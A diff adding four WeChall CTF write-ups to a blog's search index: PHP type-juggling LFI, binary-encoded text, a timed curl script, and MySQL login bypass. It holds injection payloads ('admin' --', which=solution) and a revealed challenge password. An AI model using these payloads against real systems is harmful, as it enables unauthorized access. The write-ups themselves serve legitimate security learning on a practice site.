@@ -17849,4 +17849,147 @@ text）。注意涉及两个表：INSERT 写入一个内容表（如
         <tag>sqli</tag>
       </tags>
   </entry>
+  <entry>
+    <title>WeChall - PHP 0817</title>
+    <url>/wp/WeChall/wechall-php-0817/</url>
+    <content><![CDATA[<blockquote>
+<p>I have written another include system for my dynamic webpages, but it
+seems to be vulnerable to LFI. 一个 PHP LFI 挑战，利用 PHP
+松散比较（type juggling）绕过 switch 限制。</p>
+</blockquote>
+<h3 id="challenge">Challenge</h3>
+<p>源码：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;which&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$which</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;which&#x27;</span>];</span><br><span class="line">    <span class="keyword">switch</span> (<span class="variable">$which</span>) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">require_once</span> <span class="variable">$which</span>.<span class="string">&#x27;.php&#x27;</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Hacker NoNoNo!&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p><code>index.php?which=0</code> 加载 News，<code>which=1</code> 加载
+Forum，<code>which=2</code> 加载 Guestbook。</p>
+<p>目标是加载 <code>solution.php</code>。</p>
+<h3 id="solution">Solution</h3>
+<p>PHP 的 <code>switch</code> 使用松散比较（<code>==</code> 而非
+<code>===</code>）。当字符串与整数比较时，PHP
+把字符串转成整数——<code>"solution"</code> 不以数字开头，转成
+<code>0</code>，因此 <code>"solution" == 0</code> 为
+<code>true</code>。</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="string">&quot;solution&quot;</span> == <span class="number">0</span>);  <span class="comment">// bool(true)</span></span><br></pre></td></tr></table></figure>
+<p>传入 <code>which=solution</code>：</p>
+<ul>
+<li><code>$which</code> = <code>"solution"</code></li>
+<li><code>switch</code> 比较 <code>"solution" == 0</code> →
+<code>true</code>，命中 <code>case 0</code></li>
+<li><code>case 0</code> 无代码也无 <code>break</code> →
+<strong>fall-through</strong> 到 <code>case 1</code>，再 fall-through 到
+<code>case 2</code></li>
+<li><code>case 2:</code> 的 <code>require_once $which.'.php'</code>
+执行</li>
+</ul>
+<p>注意一点：<strong><code>$which</code> 的值不会被 switch 改变</strong>
+— 匹配到 case 0 之后，<code>$which</code> 仍然是
+<code>"solution"</code>，不是 <code>0</code>。fall-through
+只是让执行流落入 case 2 的代码块，而那块代码引用的是原始变量值。</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$which</span> = <span class="string">&quot;solution&quot;</span>;</span><br><span class="line"><span class="keyword">switch</span> (<span class="variable">$which</span>) &#123;</span><br><span class="line"><span class="keyword">case</span> <span class="number">0</span>:   <span class="comment">// &quot;solution&quot; == 0 → match, 但 $which 还是 &quot;solution&quot;</span></span><br><span class="line"><span class="keyword">case</span> <span class="number">1</span>:   <span class="comment">// fall-through</span></span><br><span class="line"><span class="keyword">case</span> <span class="number">2</span>:   <span class="comment">// fall-through, require_once &quot;solution&quot;.php&quot; ← 用的是原始 $which</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>绕过了 switch 的 default 拦截，也无需 <code>.</code> <code>/</code>
+等特殊字符。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://www.wechall.net/challenge/php0817/index.php?which=solution</span><br></pre></td></tr></table></figure>
+<p>验证：页面显示 "Well done, too easy... Do you know why this is
+possible?"，<code>solution.php</code> 成功包含。</p>
+]]></content>
+      <categories>
+        <category>ctf</category>
+      </categories>
+      <tags>
+        <tag>ctf</tag>
+        <tag>writeup</tag>
+        <tag>wechall</tag>
+        <tag>php</tag>
+        <tag>exploit</tag>
+        <tag>lfi</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>WeChall - Encodings I</title>
+    <url>/wp/WeChall/wechall-encodings-1/</url>
+    <content><![CDATA[<h3 id="challenge">Challenge</h3>
+<p>The page displays a long binary string — 7-bit ASCII encoded
+text:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">10101001101000110100111100110100</span><br><span class="line">00011101001100101111100011101000</span><br><span class="line">10000011010011110011010000001101</span><br><span class="line">11010110111000101101001111010001</span><br><span class="line">00000110010111011101100011110111</span><br><span class="line">11100100110010111001000100000110</span><br><span class="line">00011110011110001111010011101001</span><br><span class="line">01011100100000101100111011111110</span><br><span class="line">10111100100100000111000011000011</span><br><span class="line">11001111100111110111110111111100</span><br><span class="line">10110010001000001101001111001101</span><br><span class="line">00000110010111000011110011111100</span><br><span class="line">11110011111010011000011110010111</span><br><span class="line">0100110010111100100101110</span><br></pre></td></tr></table></figure>
+<h3 id="solution">Solution</h3>
+<p>每 7 位一组转十进制，再转 ASCII 字符：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">bin_str = <span class="string">&quot;01010100 01101000 ...&quot;</span></span><br><span class="line">chars = [<span class="built_in">chr</span>(<span class="built_in">int</span>(b, <span class="number">2</span>)) <span class="keyword">for</span> b <span class="keyword">in</span> bin_str.split()]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join(chars))</span><br><span class="line"><span class="comment"># This text is 7-bit encoded ascii. Your password is ***********.</span></span><br></pre></td></tr></table></figure>
+<span class="spoiler" onclick="this.classList.toggle('spoiler')"><span class="spoiler-blur ">easystarter</span></span>
+]]></content>
+      <categories>
+        <category>ctf</category>
+      </categories>
+      <tags>
+        <tag>ctf</tag>
+        <tag>writeup</tag>
+        <tag>wechall</tag>
+        <tag>encoding</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>WeChall - Training - Programming 1</title>
+    <url>/wp/WeChall/wechall-training-programming-1/</url>
+    <content><![CDATA[<h3 id="challenge">Challenge</h3>
+<p>访问 <code>?action=request</code> 获取一个随机消息，在 1.337
+秒内将相同的消息提交回 <code>?answer=&lt;message&gt;</code>。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">When you visit this link you receive a message.</span><br><span class="line">Submit the same message back to .../?answer=the_message</span><br><span class="line">Your timelimit is 1.337 seconds</span><br></pre></td></tr></table></figure>
+<h3 id="solution">Solution</h3>
+<p>手动打开两个页面来不及，需要用脚本在同一次 shell
+调用中完成——变量捕获后立即提交：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">MSG=$(curl -s -b <span class="string">&#x27;WC=...&#x27;</span> <span class="string">&#x27;https://www.wechall.net/challenge/training/programming1/index.php?action=request&#x27;</span>)</span><br><span class="line">curl -s -b <span class="string">&#x27;WC=...&#x27;</span> <span class="string">&quot;https://www.wechall.net/challenge/training/programming1/index.php?answer=<span class="variable">$MSG</span>&quot;</span></span><br></pre></td></tr></table></figure>
+<p>消息每次都不同（如
+<code>CRg1xhGuz9</code>、<code>7G7sp7IJGZk</code>），且只有 1.337
+秒有效。需要登录态（WC cookie）才能请求。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> subprocess, sys</span><br><span class="line">url = <span class="string">&#x27;https://www.wechall.net/challenge/training/programming1/index.php&#x27;</span></span><br><span class="line">cookie = <span class="string">&#x27;WC=...&#x27;</span></span><br><span class="line"></span><br><span class="line">msg = subprocess.run(</span><br><span class="line">    [<span class="string">&#x27;curl&#x27;</span>, <span class="string">&#x27;-s&#x27;</span>, <span class="string">&#x27;-b&#x27;</span>, cookie, url + <span class="string">&#x27;?action=request&#x27;</span>],</span><br><span class="line">    capture_output=<span class="literal">True</span>, text=<span class="literal">True</span>).stdout.strip()</span><br><span class="line"></span><br><span class="line">result = subprocess.run(</span><br><span class="line">    [<span class="string">&#x27;curl&#x27;</span>, <span class="string">&#x27;-s&#x27;</span>, <span class="string">&#x27;-b&#x27;</span>, cookie, url + <span class="string">f&#x27;?answer=<span class="subst">&#123;msg&#125;</span>&#x27;</span>],</span><br><span class="line">    capture_output=<span class="literal">True</span>, text=<span class="literal">True</span>).stdout</span><br><span class="line"><span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure>
+<span class="spoiler" onclick="this.classList.toggle('spoiler')"><span class="spoiler-blur ">关键是用同一个 shell session
+连续执行请求和提交，中间不加人工操作。</span></span>
+]]></content>
+      <categories>
+        <category>ctf</category>
+      </categories>
+      <tags>
+        <tag>ctf</tag>
+        <tag>writeup</tag>
+        <tag>wechall</tag>
+        <tag>coding</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>WeChall - Training - MySQL I</title>
+    <url>/wp/WeChall/wechall-training-mysql-i/</url>
+    <content><![CDATA[<blockquote>
+<p>经典 MySQL 认证绕过。登录表单直接将用户输入拼接进 SQL 查询。</p>
+</blockquote>
+<h3 id="challenge">Challenge</h3>
+<p>目标：以 admin 身份登录。</p>
+<p>源码中的查询逻辑：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$password</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$password</span>);</span><br><span class="line"><span class="variable">$query</span> = <span class="string">&quot;SELECT * FROM users WHERE username=&#x27;<span class="subst">$username</span>&#x27; AND password=&#x27;<span class="subst">$password</span>&#x27;&quot;</span>;</span><br></pre></td></tr></table></figure>
+<ul>
+<li><code>$username</code> 直接从 POST 参数拼接，无任何过滤</li>
+<li><code>$password</code> 经过 <code>md5()</code>
+编码后再拼接，注入困难</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">strtolower</span>(<span class="variable">$result</span>[<span class="string">&#x27;username&#x27;</span>]) === <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">    <span class="variable">$chall</span>-&gt;<span class="title function_ invoke__">onChallengeSolved</span>(<span class="title class_">GWF_Session</span>::<span class="title function_ invoke__">getUserID</span>());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>要求返回的 username 字段为 <code>admin</code>（大小写不敏感）。</p>
+<h3 id="solution">Solution</h3>
+<p>在 username 注入 SQL 注释，截断密码检查：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Username: admin&#x27; --</span><br><span class="line">Password: (任意)</span><br></pre></td></tr></table></figure>
+<p>实际执行的 SQL：</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> username<span class="operator">=</span><span class="string">&#x27;admin&#x27;</span> <span class="comment">-- &#x27; AND password=&#x27;&lt;md5&gt;&#x27;</span></span><br></pre></td></tr></table></figure>
+<p><code>--</code> 后的内容被注释掉，查询只检查
+<code>username='admin'</code>。数据库中存在 admin
+用户，返回其数据，<code>strtolower($result['username']) === 'admin'</code>
+成立，挑战解决。</p>
+]]></content>
+      <categories>
+        <category>ctf</category>
+      </categories>
+      <tags>
+        <tag>ctf</tag>
+        <tag>writeup</tag>
+        <tag>sql-injection</tag>
+        <tag>wechall</tag>
+        <tag>mysql</tag>
+      </tags>
+  </entry>
 </search>
